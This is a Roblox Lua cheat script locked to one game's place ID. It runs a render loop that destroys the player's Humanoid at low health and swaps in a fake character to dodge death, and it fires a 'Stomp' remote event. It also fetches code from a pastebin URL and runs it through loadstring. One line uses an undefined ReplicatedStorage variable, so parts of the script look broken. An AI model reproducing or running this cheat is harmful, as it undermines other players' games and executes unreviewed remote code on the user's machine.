pcall(
    function()
        if tostring(game.PlaceId) == "2788229376" then
            local corepackages = game:GetService "CorePackages"
            local localplayer = game:GetService "Players".LocalPlayer
            local run = game:GetService "RunService"
            run:BindToRenderStep(
                "rrrrrrrrrrr",
                2000,
                function()
                    pcall(
                        function()
                            if localplayer.Character.Humanoid.Health <= 30 then
                                localplayer.Character.Humanoid:UnequipTools()
                                localplayer.Character.Humanoid:Destroy()
                                workspace.CurrentCamera.CameraSubject = localplayer.Character
                                wait()
                                local prt = Instance.new("Model", corepackages)
                                Instance.new("Part", prt).Name = "Torso"
                                Instance.new("Part", prt).Name = "Head"
                                Instance.new("Humanoid", prt).Name = "Humanoid"
                                localplayer.Character = prt
                            end
                        end
                    )
                    pcall(
                        function()
                            if localplayer.Character.Humanoid.FloorMaterial == "Plastic" then
                                ReplicatedStorage:FireServer("Stomp")
                            end
                        end
                    )
                end
            )
            loadstring(game:HttpGet("https://pastebin.com/ezrNPatQ", true))()
        end
    end
)